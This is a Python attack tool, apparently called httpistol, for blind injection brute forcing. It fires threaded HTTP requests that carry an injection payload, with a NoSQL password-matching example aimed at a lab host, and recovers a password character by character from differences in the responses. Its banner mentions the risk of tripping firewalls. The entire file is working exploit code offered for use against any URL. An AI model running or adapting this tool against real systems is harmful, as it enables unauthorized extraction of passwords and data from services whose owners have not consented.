from email import charset
import socket
import urllib.request
from urllib.error import HTTPError
import string
from threading import Thread
from threading import Lock
from time import sleep
from time import time
import sys


URL = ""
CHARSET = list("-" + string.ascii_lowercase + string.digits)  # default charset
global ERRLIST
ERRLIST = []
global PASSWD
PASSWD = ""
global HIT
lockP = Lock()

# AUTHOR: Furkan Özgültekin
# Context: A brute force for url's with the intent of it being used for character based brute force
# Dictionary brute force implementation may be intendend afterwards but right now it is ONLY INTENDED FOR CHARACTERS
# use with that discretion, thread timing and payload can be set manually to the owners liking for any url.
# Finding the right payload and specifying it is up to you but once you find it, we can execute.
# Warning: the current code is optimal for blind injection attacks, therefore you may also need to know what the response returns on a
# true clause. The threading moves on to the nex index based on this "hitclause" specification.
# USAGE:
# python3 httpistol.py -payload "/?search=admin'%26%26this.password.match(/^?{5}?.*/)%00"
# -hitclause ">admin<"
# -url http://ptl-81c01fdf-843a43d3.libcurl.so
# -v
# -tst 0.09
# -charset loc.txt (be careful with this one)
# To get a better grasp on it


def check(payload, key, verbose, hitclause):
    # legacy fixed payload example url = URL + "/?search=admin'%26%26this.password.match(/^"+key+".*/)%00"
    try:
        url = URL + payload[0] + payload[1] + key + payload[2]
        response = urllib.request.urlopen(url)
        data = response.read()
        regex_hit = hitclause in str(data)
        if (verbose):
            print("Payload: " + payload[0] + payload[1] + key + payload[2] +
                  " on " + URL + " hit:" + str(regex_hit))
        return regex_hit
    except HTTPError as err:
        if err.code == 500:
            print("Request overload on" + key)
            global ERRLIST
            ERRLIST.append(key)
            return False


class CharThread(Thread):

    def __init__(self, thread_id, name, counter, payload, key, verbose,
                 hitclause):
        Thread.__init__(self)
        self.thread_id = thread_id
        self.name = name
        self.counter = counter
        self.payload = payload
        self.key = key
        self.verbose = verbose
        self.hitclause = hitclause

    def run(self):
        global PASSWD
        global HIT
        if check(self.payload, self.key, self.verbose, self.hitclause):
            print(self.payload[1] + self.key +
                  ": True, moving on to next payload")
            lockP.acquire()
            PASSWD = self.key
            HIT = True
            lockP.release()
            return True


def parse_payload(payload):
    # parse the payload for the charset injection (suggested regex for charset is urlclause${}$urlclause)
    splitkey = ["?{", "}?"]
    payload_left = ""
    char_payload = ""
    payload_right = ""

    ind1 = payload.find(splitkey[0])
    ind2 = payload.find(splitkey[1])
    if ind1 == -1 or ind2 == -1:
        print(
            "Use ${ payload }$ seperator clause for where the brute force will be applied"
        )
        exit(0)

    split = payload.split(splitkey[0], 1)
    payload_left = split[0]
    split = split[1].split(splitkey[1], 1)
    char_payload = split[0]
    payload_right = split[1]
    return payload_left, char_payload, payload_right


def read_wordlist(wordlist_loc):
    lst = []
    with open(wordlist_loc) as file:
        for line in file:
            lst.append(line.rstrip())
            print(line.rstrip())
    return lst


def main(start_time):
    args = sys.argv
    try:
        motd_list = [
            "HTTP injection scraper tool",
            "The last resort for response scraping brute forces (Blind sqli optima)",
            "Use at your own discretion, threading is not machine optimized.",
            "Pro tip: The charset determines the amount of threading.",
            "The requests may go jittery on some of the hit requests.",
            "FYI: We shouldn't be telling you but setting the thread timing too fast may get you caught in the firewall."
        ]
        print("""\
            

██╗░░██╗████████╗████████╗██████╗░██╗░██████╗████████╗░█████╗░██╗░░░░░
██║░░██║╚══██╔══╝╚══██╔══╝██╔══██╗██║██╔════╝╚══██╔══╝██╔══██╗██║░░░░░
███████║░░░██║░░░░░░██║░░░██████╔╝██║╚█████╗░░░░██║░░░██║░░██║██║░░░░░
██╔══██║░░░██║░░░░░░██║░░░██╔═══╝░██║░╚═══██╗░░░██║░░░██║░░██║██║░░░░░
██║░░██║░░░██║░░░░░░██║░░░██║░░░░░██║██████╔╝░░░██║░░░╚█████╔╝███████╗""")
        print(motd_list[1])
        global PASSWD
        global URL
        wordlist = []
        t = -1
        hitclause = ""
        payload = []
        verbose = False

        for i in range(1, len(args)):
            if args[i] == "-charset":
                # charset is intended to be loaded from a wordlist (you need to specify the path to a txt file)
                i += 1
                wordlist = read_wordlist(args[i])
            elif args[i] == "-url":
                # Global url should be changed to local and if its null then there should be a response
                i += 1
                URL = args[i]
            elif args[i] == "-tst":
                #thread sleep time specification
                i += 1
                t = float(args[i])
            elif args[i] == "-payload":
                # parse the payload for the charset injection (suggested regex for charset is urlclause${}$urlclause)
                i += 1
                payload = parse_payload(
                    args[i]
                )  # list content: [left, payload , right] in url format but listed
            elif args[i] == "-hitclause":
                #the hit clause that is being looked for in the http/https response
                #there may be a default clause such as http/https 200 response code:
                i += 1
                hitclause = args[i]
            elif args[i] == "-v":
                verbose = True

        if t == -1:
            # default value for t
            t = 0.09
        if wordlist == []:
            wordlist = CHARSET
        if hitclause == "":
            print("You need to specify a hitclause with the -hitclause phrase")
            exit(1)
        if payload == "":
            print("You need to specify a payload with the -payload phrase")
            exit(1)
        if URL == "":
            print("You need to specify a url with the -url phrase")
            exit(1)

        sleep(0.5)
        print("Running scan on " + URL + "with payload" + payload[0] +
              payload[1] + payload[2] + ", verbose:" + str(verbose))

        sleep(2)
        print("Set")
        print("")
        sleep(0.5)

        run_attack(charset=wordlist,
                   timing_ms=t,
                   payload=payload,
                   verbose=verbose,
                   hitclause=hitclause,
                   start_time=start_time)
    except:
        #print(sys.exc_info())
        print("")
        print("Goodbye")


def run_attack(charset, timing_ms, payload, verbose, hitclause, start_time):
    global HIT
    global ERRLIST

    while True:
        lockP.acquire()
        HIT = False
        lockP.release()

        threads = []

        for c in range(len(charset)):
            test_key = PASSWD + charset[c]

            t = CharThread(c, "T-" + test_key, c, payload, test_key, verbose,
                           hitclause)

            threads.append(t)

        i = 0
        for t in threads:
            i += 1
            t.start()
            sleep(timing_ms)

            if HIT:
                ERRLIST = []
                break

        # Rerun threads for ERRLIST if needed
        if not HIT:
            for c in range(len(ERRLIST)):
                test_key = ERRLIST[c]

                t = CharThread(c, "T-" + test_key, c, payload, test_key,
                               verbose, hitclause)

                threads.append(t)

        j = 0
        for t in threads:
            j += 1
            t.join()

            if HIT and i == j:
                break

        if not HIT:
            print("Elapsed time: " + str(time() - start_time) + " seconds")

            if PASSWD != "":
                print("Brute Force Candidate = " + PASSWD)
            else:
                print(
                    "No Candidates (Try changing the wordlist if the specified key part is certain)"
                )

            exit(0)


main(time())